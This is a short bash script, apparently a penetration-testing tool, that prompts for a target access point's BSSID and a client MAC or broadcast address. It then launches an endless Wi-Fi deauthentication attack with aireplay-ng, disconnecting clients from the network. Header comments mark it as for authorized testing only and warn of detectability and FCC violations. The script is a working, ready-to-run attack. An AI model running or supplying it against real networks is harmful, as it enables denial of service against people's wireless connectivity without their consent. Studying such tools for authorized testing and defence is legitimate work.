#!/bin/bash
# Deauthentication Attack
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY
# HIGH DETECTABILITY - FCC VIOLATION IF UNAUTHORIZED

echo "[!] Deauthentication Attack"
echo "[*] Enter target BSSID (AP MAC address):"
read BSSID
echo "[*] Enter client MAC (or FF:FF:FF:FF:FF:FF for broadcast):"
read CLIENT

if [ -z "$BSSID" ] || [ -z "$CLIENT" ]; then
    echo "[-] Missing parameters"
    exit 1
fi

echo "[+] Targeting:"
echo "    AP: $BSSID"
echo "    Client: $CLIENT"
echo ""
echo "[!] Starting deauth attack (Press Ctrl+C to stop)"

# Use aireplay-ng for deauth
aireplay-ng --deauth 0 -a $BSSID -c $CLIENT wlan1mon
